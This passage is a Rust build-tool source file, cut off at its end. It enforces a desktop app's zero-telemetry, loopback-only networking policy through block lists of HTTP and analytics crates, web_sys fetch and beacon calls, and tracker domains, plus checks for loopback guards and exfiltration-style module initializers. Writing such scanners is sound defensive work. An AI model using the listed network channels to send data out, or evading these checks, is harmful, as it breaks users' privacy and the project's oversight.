//! `cargo xtask telemetry`: enforce CurveBook's zero-telemetry, zero-cloud, and local-only
//! networking policy across manifests, Rust sources, workflows, and web security headers (`R0.6`).

use std::collections::{BTreeMap, BTreeSet};
use std::path::Path;

use crate::rust_lex::{RustLexer, StrippedRust, is_cfg_test_only_submodule, is_ident_byte, strip_non_prod_rust_both as strip_non_prod_rust};
use crate::scan_util::{
    format_error_list, has_ext_ci, is_real_dir, lower_ext, next_ident_pattern_match, rel_slash_lossy, unquote_scalar, walk_file_paths, walk_rel_files,
};

#[derive(Debug, Clone, PartialEq, Eq)]
struct LockPackage {
    name: String,
    version: String,
    source: Option<String>,
}

fn parse_cargo_lock(lock_text: &str) -> Vec<LockPackage> {
    let mut pkgs = Vec::new();
    let mut current: Option<LockPackage> = None;

    for raw in lock_text.lines() {
        let line = raw.trim();
        if line == "[[package]]" || line.starts_with('[') {
            if let Some(pkg) = current.take()
                && !pkg.name.is_empty()
            {
                pkgs.push(pkg);
            }
            if line == "[[package]]" {
                current = Some(LockPackage { name: String::new(), version: String::new(), source: None });
            }
            continue;
        }
        if let Some(pkg) = current.as_mut()
            && let Some((k, v)) = line.split_once('=')
        {
            match k.trim() {
                "name" => pkg.name = unquote_scalar(v).to_owned(),
                "version" => pkg.version = unquote_scalar(v).to_owned(),
                "source" => pkg.source = Some(unquote_scalar(v).to_owned()),
                _ => {}
            }
        }
    }
    if let Some(pkg) = current
        && !pkg.name.is_empty()
    {
        pkgs.push(pkg);
    }
    pkgs
}

const ALLOWED_LOOPBACK_NET_FILES: &[&str] = &["crates/ui-egui/src/control_io.rs", "crates/mcp/src/tools.rs", "apps/curvebook/src/main.rs"];

const ALWAYS_BANNED_NET_PATTERNS: &[&str] = &[
    "UdpSocket",
    "ToSocketAddrs",
    "core::net",
    "UnixStream",
    "UnixListener",
    "UnixDatagram",
    "web_sys::WebSocket",
    "web_sys::EventSource",
    "web_sys::XmlHttpRequest",
    "web_sys::Request",
    "web_sys::RequestInit",
    "web_sys::RequestMode",
    "web_sys::Response",
    "web_sys::Headers",
    "web_sys::Navigator",
    "web_sys::Worker",
    "web_sys::SharedWorker",
    "web_sys::ServiceWorkerContainer",
    "fetch_with_str",
    "fetch_with_request",
    "fetch_with_request_and_init",
    "send_beacon",
    "send_with_str",
    "send_with_u8_array",
];
const LOOPBACK_SCOPED_NET_PATTERNS: &[&str] = &["TcpStream", "TcpListener", "std::net"];

const BANNED_WEB_SYS_NET_FEATURES: &[&str] = &[
    "websocket",
    "eventsource",
    "xmlhttprequest",
    "request",
    "requestinit",
    "requestmode",
    "response",
    "headers",
    "navigator",
    "worker",
    "sharedworker",
    "serviceworker",
    "beacon",
];

const BANNED_WEB_AND_WORKFLOW_TERMS: &[&str] = &[
    "sonarcloud",
    "sonarsource",
    "sonar_token",
    "codecov",
    "coveralls",
    "googletagmanager",
    "google-analytics",
    "gtag(",
    "plausible",
    "posthog",
    "mixpanel",
    "amplitude",
    "sentry",
    "bugsnag",
    "datadog",
    "clarity.ms",
    "hotjar",
    "navigator.sendbeacon",
    "sendbeacon",
    "xmlhttprequest",
    "new websocket",
    "eventsource",
    "new worker",
    "new sharedworker",
    "serviceworker",
    "new image",
];

const ALLOWED_HTML_EXTERNAL_URLS: &[&str] = &["http://www.w3.org/2000/svg", "http://www.w3.org/1999/xhtml"];

const REQUIRED_CSP_DIRECTIVES: &[&str] =
    &["default-src 'self'", "connect-src 'self'", "object-src 'none'", "frame-ancestors 'none'", "base-uri 'self'", "form-action 'none'"];

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TelemetryViolation {
    pub check: u8,
    pub path: String,
    pub line: usize,
    pub detail: String,
}

impl std::fmt::Display for TelemetryViolation {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}:{}: [check-{}] {}", self.path, self.line, self.check, self.detail)
    }
}

fn push_v(out: &mut Vec<TelemetryViolation>, check: u8, path: &str, line: usize, detail: impl Into<String>) {
    out.push(TelemetryViolation { check, path: path.to_owned(), line, detail: detail.into() });
}

#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
pub struct TelemetryStats {
    pub manifests: usize,
    pub lock_packages: usize,
    pub rust_sources: usize,
    pub web_and_workflow_files: usize,
    pub workflows: usize,
    pub header_configs: usize,
}

/// Execute `cargo xtask telemetry`.
pub fn run(root: &Path, args: &[String]) -> Result<(), String> {
    if !args.is_empty() {
        return Err(format!("usage: cargo xtask telemetry (unexpected args: `{}`)", args.join(" ")));
    }
    let (stats, violations) = run_checks(root)?;
    if violations.is_empty() {
        println!(
            "telemetry: 0 violations across checks 1-5 ({} manifests, {} locked packages, {} Rust sources, {} web/workflow/packaging files, {} workflows, {} header configs)",
            stats.manifests, stats.lock_packages, stats.rust_sources, stats.web_and_workflow_files, stats.workflows, stats.header_configs
        );
        return Ok(());
    }
    Err(format_error_list("zero-telemetry violation(s) found", &violations))
}

/// Run all five zero-telemetry policy checks against `root`.
pub fn run_checks(root: &Path) -> Result<(TelemetryStats, Vec<TelemetryViolation>), String> {
    let mut stats = TelemetryStats::default();
    let mut violations = Vec::new();

    stats.manifests = check_banned_crates(root, &mut violations, &mut stats.lock_packages)?;
    stats.rust_sources = check_rust_network_primitives(root, &mut violations)?;
    stats.web_and_workflow_files = check_web_and_workflow_telemetry(root, &mut violations)?;
    stats.workflows = check_workflow_security(root, &mut violations)?;
    stats.header_configs = check_web_security_headers(root, &mut violations)?;

    violations.sort_by(|a, b| a.check.cmp(&b.check).then_with(|| a.path.cmp(&b.path)).then_with(|| a.line.cmp(&b.line)));
    Ok((stats, violations))
}

/// Check 1: scan all workspace `Cargo.toml` manifests and `Cargo.lock` for banned crates.
fn check_banned_crates(root: &Path, violations: &mut Vec<TelemetryViolation>, lock_count: &mut usize) -> Result<usize, String> {
    let mut manifests = Vec::new();
    walk_file_paths(root, &skip_workspace_dir, &|p| p.file_name().is_some_and(|n| n == "Cargo.toml"), &mut manifests)?;
    manifests.sort();
    if manifests.is_empty() {
        return Err(String::from("no Cargo.toml manifests found in workspace"));
    }

    let mut workspace_web_sys_aliases = BTreeSet::new();
    let root_cargo = root.join("Cargo.toml");
    if root_cargo.is_file() {
        let root_text = std::fs::read_to_string(&root_cargo).map_err(|e| format!("Cargo.toml: {e}"))?;
        workspace_web_sys_aliases = collect_workspace_web_sys_aliases(&root_text);
    }

    for manifest in &manifests {
        let rel = rel_slash_lossy(root, manifest);
        let text = std::fs::read_to_string(manifest).map_err(|e| format!("{rel}: {e}"))?;
        scan_manifest_for_banned_crates(&rel, &text, &workspace_web_sys_aliases, violations);
    }

    let lock_path = root.join("Cargo.lock");
    let lock_text = std::fs::read_to_string(&lock_path).map_err(|e| format!("Cargo.lock: {e}"))?;
    let lock_pkgs = parse_cargo_lock(&lock_text);
    *lock_count = lock_pkgs.len();
    scan_lock_for_banned_crates(&lock_text, &lock_pkgs, violations);

    Ok(manifests.len())
}

fn norm_crate_ident(raw: &str) -> String {
    raw.trim().to_ascii_lowercase().replace('_', "-")
}

fn is_web_sys_name(name: &str, aliases: &BTreeSet<String>) -> bool {
    let norm = norm_crate_ident(name);
    norm == "web-sys" || aliases.contains(&norm)
}

fn dep_path_parts(path: &[String]) -> Option<(&str, Option<&str>)> {
    match path {
        [first, dep] if is_dep_table_keyword(first) => Some((dep.as_str(), None)),
        [first, dep, sub, ..] if is_dep_table_keyword(first) => Some((dep.as_str(), Some(sub.as_str()))),
        [w, d, dep] if w == "workspace" && d == "dependencies" => Some((dep.as_str(), None)),
        [w, d, dep, sub, ..] if w == "workspace" && d == "dependencies" => Some((dep.as_str(), Some(sub.as_str()))),
        [t, _, d, dep] if t == "target" && is_dep_table_keyword(d) => Some((dep.as_str(), None)),
        [t, _, d, dep, sub, ..] if t == "target" && is_dep_table_keyword(d) => Some((dep.as_str(), Some(sub.as_str()))),
        _ => None,
    }
}

fn collect_workspace_web_sys_aliases(root_toml: &str) -> BTreeSet<String> {
    let mut aliases = BTreeSet::new();
    for entry in crate::scan_util::parse_toml_entries(root_toml) {
        if let crate::scan_util::TomlEntry::Leaf { path, value, .. } = entry
            && path.len() >= 4
            && path[0] == "workspace"
            && path[1] == "dependencies"
            && path[3] == "package"
            && value.as_str().is_some_and(|pkg| norm_crate_ident(pkg) == "web-sys")
        {
            aliases.insert(norm_crate_ident(&path[2]));
        }
    }
    aliases
}

fn check_feature_forwarding_value(
    rel: &str,
    line_no: usize,
    value: &crate::scan_util::TomlVal,
    web_sys_aliases: &BTreeSet<String>,
    violations: &mut Vec<TelemetryViolation>,
) {
    let mut items = Vec::new();
    value.collect_strings(&mut items);
    for item in items {
        let trimmed = item.trim();
        if let Some(dep_only) = trimmed.strip_prefix("dep:") {
            let dep_name = dep_only.split('/').next().unwrap_or(dep_only).trim_end_matches('?');
            if is_banned_crate_name(dep_name) {
                push_v(violations, 1, rel, line_no, format!("banned telemetry/HTTP crate `{dep_name}` activated in `[features]`"));
            }
        }
        if let Some((raw_dep, feat)) = trimmed.split_once('/') {
            let dep_name = raw_dep.strip_prefix("dep:").unwrap_or(raw_dep).trim_end_matches('?').trim();
            if is_banned_crate_name(dep_name) {
                push_v(violations, 1, rel, line_no, format!("banned telemetry/HTTP crate `{dep_name}` activated in `[features]`"));
            }
            if is_web_sys_name(dep_name, web_sys_aliases) {
                let lower_feat = feat.trim().to_ascii_lowercase();
                if BANNED_WEB_SYS_NET_FEATURES.contains(&lower_feat.as_str()) {
                    push_v(
                        violations,
                        1,
                        rel,
                        line_no,
                        format!("banned `web-sys` network feature `{}` activated via `[features]` (`{trimmed}`)", feat.trim()),
                    );
                }
            }
        }
    }
}

fn scan_manifest_for_banned_crates(rel: &str, toml: &str, workspace_web_sys_aliases: &BTreeSet<String>, violations: &mut Vec<TelemetryViolation>) {
    let entries = crate::scan_util::parse_toml_entries(toml);
    let mut dep_table_pkg: BTreeMap<Vec<String>, String> = BTreeMap::new();
    let mut local_web_sys_aliases: BTreeSet<String> = BTreeSet::new();
    let mut local_ws_inherited_aliases: BTreeSet<String> = BTreeSet::new();
    let mut local_non_web_sys_aliases: BTreeSet<String> = BTreeSet::new();
    for entry in &entries {
        if let crate::scan_util::TomlEntry::Leaf { path, value, .. } = entry
            && let Some((dep, Some(sub))) = dep_path_parts(path)
        {
            let dep_norm = norm_crate_ident(dep);
            if sub == "package"
                && let Some(pkg) = value.as_str()
            {
                let pkg_norm = norm_crate_ident(pkg);
                if let Some(table_prefix) = path.get(..path.len().saturating_sub(1)) {
                    dep_table_pkg.insert(table_prefix.to_vec(), pkg_norm.clone());
                }
                if pkg_norm == "web-sys" {
                    local_web_sys_aliases.insert(dep_norm);
                } else {
                    local_non_web_sys_aliases.insert(dep_norm);
                }
            } else if sub == "workspace" && matches!(value, crate::scan_util::TomlVal::Other(s) if s == "true") {
                local_ws_inherited_aliases.insert(dep_norm);
            }
        }
    }
    let mut web_sys_aliases = workspace_web_sys_aliases.clone();
    web_sys_aliases.extend(local_web_sys_aliases.iter().cloned());
    for shadowed in &local_non_web_sys_aliases {
        if !local_web_sys_aliases.contains(shadowed) && !local_ws_inherited_aliases.contains(shadowed) {
            web_sys_aliases.remove(shadowed);
        }
    }

    let mut seen_dep_hits: BTreeSet<(usize, String)> = BTreeSet::new();
    for entry in &entries {
        match entry {
            crate::scan_util::TomlEntry::Section { line, path } => {
                if let Some((dep, None)) = dep_path_parts(path)
                    && is_banned_crate_name(dep)
                    && seen_dep_hits.insert((*line, norm_crate_ident(dep)))
                {
                    push_v(violations, 1, rel, *line, format!("banned telemetry/HTTP crate `{dep}` in section `[{}]`", path.join(".")));
                }
            }
            crate::scan_util::TomlEntry::Leaf { line, path, value } => {
                if path.first().map(String::as_str) == Some("features") {
                    check_feature_forwarding_value(rel, *line, value, &web_sys_aliases, violations);
                    continue;
                }
                let Some((dep, sub)) = dep_path_parts(path) else {
                    continue;
                };
                if dep != "package" && is_banned_crate_name(dep) && seen_dep_hits.insert((*line, norm_crate_ident(dep))) {
                    push_v(violations, 1, rel, *line, format!("banned telemetry/HTTP crate `{dep}` in `Cargo.toml`"));
                }
                if sub == Some("package")
                    && let Some(pkg) = value.as_str()
                    && is_banned_crate_name(pkg)
                {
                    push_v(violations, 1, rel, *line, format!("banned telemetry/HTTP crate `{pkg}` (aliased via `package =`)"));
                }
                if sub == Some("features") {
                    let is_ws = path
                        .get(..path.len().saturating_sub(1))
                        .and_then(|pfx| dep_table_pkg.get(pfx))
                        .map_or_else(|| is_web_sys_name(dep, &web_sys_aliases), |pkg| pkg == "web-sys");
                    if is_ws {
                        let mut feats = Vec::new();
                        value.collect_strings(&mut feats);
                        for val in feats {
                            let lower = val.trim().to_ascii_lowercase();
                            if BANNED_WEB_SYS_NET_FEATURES.contains(&lower.as_str()) {
                                push_v(violations, 1, rel, *line, format!("banned `web-sys` network feature `{}` in `Cargo.toml`", val.trim()));
                            }
                        }
                    }
                }
            }
        }
    }
}

fn scan_lock_for_banned_crates(lock_text: &str, lock_pkgs: &[LockPackage], violations: &mut Vec<TelemetryViolation>) {
    let mut pkg_lines: BTreeMap<String, Vec<usize>> = BTreeMap::new();
    let mut in_pkg = false;
    for (idx, raw) in lock_text.lines().enumerate() {
        let line = raw.trim();
        if line == "[[package]]" {
            in_pkg = true;
            continue;
        }
        if line.starts_with('[') {
            in_pkg = false;
            continue;
        }
        if in_pkg
            && let Some((k, v)) = line.split_once('=')
            && k.trim() == "name"
        {
            pkg_lines.entry(unquote_scalar(v).to_owned()).or_default().push(idx + 1);
        }
    }

    for pkg in lock_pkgs {
        if is_banned_crate_name(&pkg.name) {
            let line = pkg_lines.get(&pkg.name).and_then(|v| v.first().copied()).unwrap_or(1);
            push_v(violations, 1, "Cargo.lock", line, format!("banned telemetry/HTTP crate `{}` ({}) in Cargo.lock", pkg.name, pkg.version));
        }
    }
}

#[must_use]
pub fn is_banned_crate_name(raw: &str) -> bool {
    let norm = norm_crate_ident(raw);
    if norm.is_empty() {
        return false;
    }
    const EXACT_ONLY: &[&str] = &["reqwest", "ureq", "hyper", "surf", "isahc", "curl", "attohttpc", "minreq", "awc", "rama"];
    const EXACT_OR_DASH_PREFIX: &[&str] = &["sentry", "opentelemetry", "tracing-opentelemetry"];
    const WILDCARD_PREFIXES: &[&str] =
        &["posthog", "amplitude", "mixpanel", "segment", "bugsnag", "rollbar", "datadog", "newrelic", "honeycomb", "aptabase"];

    EXACT_ONLY.contains(&norm.as_str())
        || EXACT_OR_DASH_PREFIX.iter().any(|p| norm == *p || norm.starts_with(&format!("{p}-")))
        || WILDCARD_PREFIXES.iter().any(|p| norm.starts_with(p))
}

fn is_dep_table_keyword(seg: &str) -> bool {
    matches!(seg, "dependencies" | "dev-dependencies" | "build-dependencies")
}

/// Check 2: scan non-test Rust sources under `crates/**/src/**/*.rs` and `apps/**/src/**/*.rs`.
fn check_rust_network_primitives(root: &Path, violations: &mut Vec<TelemetryViolation>) -> Result<usize, String> {
    let mut files = Vec::new();
    for top in ["crates", "apps"] {
        let base = root.join(top);
        if base.is_dir() {
            collect_non_test_src_rs_files(root, &base, &mut files)?;
        }
    }
    files.sort();
    files.dedup();

    for rel in &files {
        let src = std::fs::read_to_string(root.join(rel)).map_err(|e| format!("{rel}: {e}"))?;
        let stripped = strip_non_prod_rust(&src);
        scan_rust_file_network(rel, &stripped, violations);
    }
    Ok(files.len())
}

fn scan_rust_file_network(rel: &str, stripped: &StrippedRust, violations: &mut Vec<TelemetryViolation>) {
    let (compact_prod, prod_lines) = crate::layers::collapse_colon_whitespace(&stripped.prod_code);
    scan_code_patterns_with_lines(rel, &compact_prod, &prod_lines, 2, ALWAYS_BANNED_NET_PATTERNS, "banned network socket primitive", violations);
    check_rust_network_use_imports(rel, &stripped.prod_code, violations);
    check_js_sys_network_strings(rel, stripped, violations);

    let allowed = ALLOWED_LOOPBACK_NET_FILES.contains(&rel);
    let mut scoped_hits = Vec::new();
    scan_code_patterns_with_lines(
        rel,
        &compact_prod,
        &prod_lines,
        2,
        LOOPBACK_SCOPED_NET_PATTERNS,
        "unapproved std::net / TCP usage",
        &mut scoped_hits,
    );
    collect_scoped_net_use_hits(rel, &stripped.prod_code, &mut scoped_hits);

    if !allowed {
        violations.extend(scoped_hits);
        return;
    }
    check_allowlisted_net_file(rel, stripped, &scoped_hits, violations);
}

fn check_rust_network_use_imports(rel: &str, prod_code: &str, violations: &mut Vec<TelemetryViolation>) {
    const ALWAYS_BANNED_IMPORT_ITEMS: &[&str] = &[
        "std::net::UdpSocket",
        "net::UdpSocket",
        "std::net::ToSocketAddrs",
        "net::ToSocketAddrs",
        "core::net",
        "core::net::*",
        "std::os::unix::net",
        "std::os::unix::net::*",
        "os::unix::net",
        "unix::net",
        "web_sys::*",
    ];
    const BANNED_NET_LEAVES: &[&str] = &[
        "UdpSocket",
        "ToSocketAddrs",
        "UnixStream",
        "UnixListener",
        "UnixDatagram",
        "WebSocket",
        "EventSource",
        "XmlHttpRequest",
        "Request",
        "RequestInit",
        "RequestMode",
        "Response",
        "Headers",
        "Navigator",
        "Worker",
        "SharedWorker",
        "ServiceWorkerContainer",
    ];
    for (line, stmt) in crate::layers::collect_use_statements(prod_code) {
        let mut items = Vec::new();
        crate::layers::expand_use_tree_items("", &stmt, &mut items);
        for item in items {
            let norm = item.path.strip_prefix("::").unwrap_or(&item.path);
            let matched =
                ALWAYS_BANNED_IMPORT_ITEMS.iter().find(|&&p| norm == p).or_else(|| (norm == "web_sys" && item.alias.is_some()).then_some(&"web_sys"));
            if let Some(pat) = matched {
                push_v(violations, 2, rel, line, format!("banned network socket primitive import `{pat}`"));
            } else if ["std::net::", "core::net::", "std::os::unix::net::", "web_sys::"].iter().any(|p| norm.starts_with(p))
                && norm.rsplit("::").next().is_some_and(|leaf| BANNED_NET_LEAVES.contains(&leaf))
            {
                push_v(violations, 2, rel, line, format!("banned network socket primitive import `{norm}`"));
            }
        }
    }
}

fn collect_scoped_net_use_hits(rel: &str, prod_code: &str, out: &mut Vec<TelemetryViolation>) {
    for (line, stmt) in crate::layers::collect_use_statements(prod_code) {
        let mut items = Vec::new();
        crate::layers::expand_use_tree_items("", &stmt, &mut items);
        for item in items {
            let norm = item.path.strip_prefix("::").unwrap_or(&item.path);
            if norm == "std::net" || norm == "std::net::*" || norm.starts_with("std::net::") {
                out.push(TelemetryViolation { check: 2, path: rel.to_owned(), line, detail: format!("unapproved std::net / TCP usage `{norm}`") });
            }
        }
    }
}

fn check_js_sys_network_strings(rel: &str, stripped: &StrippedRust, violations: &mut Vec<TelemetryViolation>) {
    let uses_wasm_bridge =
        stripped.prod_code.contains("js_sys") || stripped.prod_code.contains("web_sys") || stripped.prod_code.contains("wasm_bindgen");
    if !uses_wasm_bridge {
        return;
    }
    for (line_no, raw_lit) in extract_rust_string_literals(&stripped.no_comments_code) {
        let lower = raw_lit.trim().to_ascii_lowercase();
        if let Some(matched) = find_banned_js_network_in_literal(&lower) {
            violations.push(TelemetryViolation {
                check: 2,
                path: rel.to_owned(),
                line: line_no,
                detail: format!("forbidden JS network reflection string `{matched}` in WASM source"),
            });
        }
    }
}

fn find_banned_js_network_in_literal(lower: &str) -> Option<&'static str> {
    for (needle, need_boundary) in [
        ("fetch_with_request_and_init", true),
        ("fetch_with_request", true),
        ("fetch_with_str", true),
        ("fetch", true),
        ("sendbeacon", true),
        ("send_beacon", true),
        ("websocket", true),
        ("eventsource", true),
        ("xmlhttprequest", true),
    ] {
        let mut pos = 0usize;
        while let Some(rel) = lower.get(pos..).and_then(|s| s.find(needle)) {
            let hit = pos + rel;
            let end = hit + needle.len();
            let left_ok = !need_boundary || hit == 0 || !is_ident_byte(lower.as_bytes()[hit - 1]);
            let right_ok = !need_boundary || end == lower.len() || !is_ident_byte(lower.as_bytes()[end]);
            if left_ok && right_ok {
                return Some(needle);
            }
            pos = hit + 1;
        }
    }
    None
}

fn extract_rust_string_literals(src: &str) -> Vec<(usize, String)> {
    let mut lex = RustLexer::new(src);
    let mut lits = Vec::new();
    while !lex.is_eof() {
        if lex.try_read_comment().is_some() {
            continue;
        }
        if let Some(lit) = lex.try_read_raw_string() {
            lits.push((lit.start_line, lit.text));
            continue;
        }
        if lex.try_skip_char_literal() {
            continue;
        }
        if let Some(lit) = lex.try_read_quoted_string() {
            lits.push((lit.start_line, lit.text));
            continue;
        }
        lex.advance_one();
    }
    lits
}

fn check_allowlisted_net_file(rel: &str, stripped: &StrippedRust, scoped_hits: &[TelemetryViolation], violations: &mut Vec<TelemetryViolation>) {
    check_net_alias_imports(rel, &stripped.prod_code, violations);

    let fn_spans = collect_rust_fn_spans(&stripped.prod_code);
    let mut checked_fn_sockets = 0usize;
    for &(start, end, line_no) in &fn_spans {
        let Some(fn_prod) = stripped.prod_code.get(start..end) else {
            continue;
        };
        if !fn_opens_socket(fn_prod) {
            continue;
        }
        checked_fn_sockets += 1;
        let fn_lits = stripped.no_comments_code.get(start..end).unwrap_or(fn_prod);
        if !slice_has_loopback_guard(fn_prod, fn_lits) {
            violations.push(TelemetryViolation {
                check: 2,
                path: rel.to_owned(),
                line: line_no,
                detail: String::from(
                    "allowlisted network function lacks a loopback guard (`is_loopback`, `[127, 0, 0, 1]`, `127.0.0.1`, `::1`, or `LOCALHOST`)",
                ),
            });
        }
        if let Some((ip_line, bad_ip)) = find_non_loopback_ip_literal(fn_lits, line_no) {
            violations.push(TelemetryViolation {
                check: 2,
                path: rel.to_owned(),
                line: ip_line,
                detail: format!("non-loopback socket literal `{bad_ip}` in allowlisted network function"),
            });
        }
        if let Some((ip_line, bad_ip)) = find_non_loopback_numeric_ip(fn_prod, line_no) {
            violations.push(TelemetryViolation {
                check: 2,
                path: rel.to_owned(),
                line: ip_line,
                detail: format!("non-loopback numeric IP `{bad_ip}` in allowlisted network function"),
            });
        }
    }

    // Also inspect module-level code outside all `fn` bodies (e.g. `static EXFIL: LazyLock<...>`).
    let (outside_prod, outside_lits) = mask_spans_preserving_lines(&stripped.prod_code, &stripped.no_comments_code, &fn_spans);
    if fn_opens_socket(&outside_prod) {
        let outside_line = outside_prod
            .lines()
            .enumerate()
            .find(|(_, l)| l.contains("TcpStream") || l.contains("TcpListener") || l.contains("bind(") || l.contains("connect"))
            .map_or(1, |(idx, _)| idx + 1);
        if !slice_has_loopback_guard(&outside_prod, &outside_lits) {
            violations.push(TelemetryViolation {
                check: 2,
                path: rel.to_owned(),
                line: outside_line,
                detail: String::from(
                    "allowlisted module-level network initializer lacks a loopback guard (`is_loopback`, `[127, 0, 0, 1]`, `127.0.0.1`, `::1`, or `LOCALHOST`)",
                ),
            });
        }
        if let Some((ip_line, bad_ip)) = find_non_loopback_ip_literal(&outside_lits, 1) {
            violations.push(TelemetryViolation {
                check: 2,
                path: rel.to_owned(),
                line: ip_line,
                detail: format!("non-loopback socket literal `{bad_ip}` in allowlisted module-level initializer"),
            });
        }
        if let Some((ip_line, bad_ip)) = find_non_loopback_numeric_ip(&outside_prod, 1) {
            violations.push(TelemetryViolation {
                check: 2,
                path: rel.to_owned(),
                line: ip_line,
                detail: format!("non-loopback numeric IP `{bad_ip}` in allowlisted module-level initializer"),
            });
        }
    } else if checked_fn_sockets == 0 && !scoped_hits.is_empty() && !slice_has_loopback_guard(&stripped.prod_code, &stripped.no_comments_code) {
        violations.push(TelemetryViolation {
            check: 2,
            path: rel.to_owned(),
            line: scoped_hits.first().map_or(1, |v| v.line),
            detail: String::from(
                "allowlisted network module lacks a loopback guard (`is_loopback`, `[127, 0, 0, 1]`, `127.0.0.1`, `::1`, or `LOCALHOST`)",
            ),
        });
    }
}

fn mask_spans_preserving_lines(prod_code: &str, lits_code: &str, spans: &[(usize, usize, usize)]) -> (String, String) {
    let mut prod = prod_code.as_bytes().to_vec();
    let mut lits = lits_code.as_bytes().to_vec();
    for &(start, end, _) in spans {
        for buf in [&mut prod, &mut lits] {
            for b in buf.iter_mut().take(end).skip(start) {
                if *b != b'\n' {
                    *b = b' ';
                }
            }
        }
    }
    (
        String::from_utf8(prod).unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned()),
        String::from_utf8(lits).unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned()),
    )
}

fn check_net_alias_imports(rel: &str, prod_code: &str, violations: &mut Vec<TelemetryViolation>) {
    for (line, stmt) in crate::layers::collect_use_statements(prod_code) {
        let mut items = Vec::new();
        crate::layers::expand_use_tree_items("", &stmt, &mut items);
        for item in items {
            let norm = item.path.strip_prefix("::").unwrap_or(&item.path);
            let is_net_wildcard_or_alias =
                norm == "std::net::*" || (norm == "std::net" && item.alias.is_some()) || (norm.starts_with("std::net::") && item.alias.is_some());
            if is_net_wildcard_or_alias {
                violations.push(TelemetryViolation {
                    check: 2,
                    path: rel.to_owned(),
                    line,
                    detail: String::from("aliasing or wildcard-importing `std::net` is forbidden in allowlisted files"),
                });
            }
        }
    }
}

fn collect_rust_fn_spans(prod_code: &str) -> Vec<(usize, usize, usize)> {
    let bytes = prod_code.as_bytes();
    let mut spans = Vec::new();
    let mut i = 0usize;
    let mut line = 1usize;
    while i < bytes.len() {
        if bytes[i] == b'\n' {
            line += 1;
            i += 1;
            continue;
        }
        let is_fn =
            bytes[i..].starts_with(b"fn") && (i == 0 || !is_ident_byte(bytes[i - 1])) && bytes.get(i + 2).is_some_and(|b| b.is_ascii_whitespace());
        if !is_fn {
            i += 1;
            continue;
        }
        let fn_start = i;
        let fn_line = line;
        if let Some(body_open) = find_fn_body_open(bytes, i + 2) {
            let mut depth = 1usize;
            let mut p = body_open + 1;
            while p < bytes.len() && depth > 0 {
                match bytes[p] {
                    b'{' => depth += 1,
                    b'}' => depth -= 1,
                    _ => {}
                }
                p += 1;
            }
            spans.push((fn_start, p, fn_line));
        }
        i += 2;
    }
    spans
}

fn find_fn_body_open(bytes: &[u8], mut p: usize) -> Option<usize> {
    while p < bytes.len() && bytes[p].is_ascii_whitespace() {
        p += 1;
    }
    if p >= bytes.len() || !is_ident_byte(bytes[p]) {
        return None;
    }
    while p < bytes.len() && is_ident_byte(bytes[p]) {
        p += 1;
    }
    let mut paren_depth = 0usize;
    let mut bracket_depth = 0usize;
    let mut angle_depth = 0usize;
    let mut saw_params = false;
    while p < bytes.len() {
        match bytes[p] {
            b';' if paren_depth == 0 && bracket_depth == 0 && angle_depth == 0 => return None,
            b'(' => {
                if paren_depth == 0 && bracket_depth == 0 && angle_depth == 0 {
                    saw_params = true;
                }
                paren_depth += 1;
            }
            b')' => paren_depth = paren_depth.saturating_sub(1),
            b'[' => bracket_depth += 1,
            b']' => bracket_depth = bracket_depth.saturating_sub(1),
            b'<' if paren_depth == 0 && bracket_depth == 0 => angle_depth += 1,
            b'>' if paren_depth == 0 && bracket_depth == 0 && angle_depth > 0 && bytes.get(p.wrapping_sub(1)) != Some(&b'-') => {
                angle_depth -= 1;
            }
            b'{' if saw_params && paren_depth == 0 && bracket_depth == 0 && angle_depth == 0 => return Some(p),
            b'{' => {
                let mut brace_depth = 1usize;
                p += 1;
                while p < bytes.len() && brace_depth > 0 {
                    match bytes[p] {
                        b'{' => brace_depth += 1,
                        b'}' => brace_depth -= 1,
                        _ => {}
                    }
                    p += 1;
                }
                continue;
            }
            _ => {}
        }
        p += 1;
    }
    None
}

fn fn_opens_socket(fn_prod: &str) -> bool {
    let (compact, _) = crate::layers::collapse_colon_whitespace(fn_prod);
    compact.contains("TcpListener::bind")
        || compact.contains("TcpStream::connect")
        || ((compact.contains("TcpListener") || compact.contains("TcpStream") || compact.contains("std::net"))
            && (compact.contains("::bind(") || compact.contains("::connect(") || compact.contains("connect_timeout(")))
}

fn slice_has_loopback_guard(prod_code: &str, no_comments_code: &str) -> bool {
    let compact: String = prod_code.chars().filter(|c| !c.is_whitespace()).collect();
    if compact.contains(".is_loopback()") || compact.contains("validate_loopback_addr(") || compact.contains("bind_control_tcp_listener(") {
        return true;
    }
    let has_loopback_addr_ctor = compact.contains("SocketAddr::from(([127,0,0,1],")
        || compact.contains("SocketAddrV4::new(Ipv4Addr::LOCALHOST,")
        || compact.contains("SocketAddr::from((Ipv4Addr::LOCALHOST,")
        || compact.contains("SocketAddr::from((IpAddr::V4(Ipv4Addr::LOCALHOST),")
        || compact.contains("SocketAddr::from((Ipv6Addr::LOCALHOST,")
        || compact.contains("::bind((Ipv4Addr::LOCALHOST,")
        || compact.contains("::connect((Ipv4Addr::LOCALHOST,")
        || compact.contains("::bind(([127,0,0,1],")
        || compact.contains("::connect(([127,0,0,1],");
    if has_loopback_addr_ctor {
        return true;
    }
    for line in no_comments_code.lines() {
        let in_socket_ctx = line.contains("TcpListener")
            || line.contains("TcpStream")
            || line.contains("SocketAddr")
            || line.contains("bind(")
            || line.contains("connect")
            || line.contains(".parse");
        if in_socket_ctx && (line.contains("\"127.0.0.1") || line.contains("\"::1") || line.contains("\"[::1]")) {
            return true;
        }
    }
    false
}

fn find_non_loopback_ip_literal(fn_lits: &str, base_line: usize) -> Option<(usize, String)> {
    for (rel_line, lit) in extract_rust_string_literals(fn_lits) {
        if let Some(bad) = check_non_loopback_host_or_ip(&lit) {
            return Some((base_line + rel_line.saturating_sub(1), bad));
        }
    }
    None
}

/// Detect non-loopback numeric IP constructors in production Rust code (e.g.,
/// `Ipv4Addr::UNSPECIFIED`, `Ipv6Addr::UNSPECIFIED`, `Ipv4Addr::new((8), 8, 8, 8)`,
/// `Ipv4Addr::from(0)`, `Ipv6Addr::from_bits(0)`, `([0; 4], 9000)`, `([0, 0, ..., 0], 443)`).
fn find_non_loopback_numeric_ip(fn_prod: &str, base_line: usize) -> Option<(usize, String)> {
    let (compact, lines) = crate::layers::collapse_colon_whitespace(fn_prod);
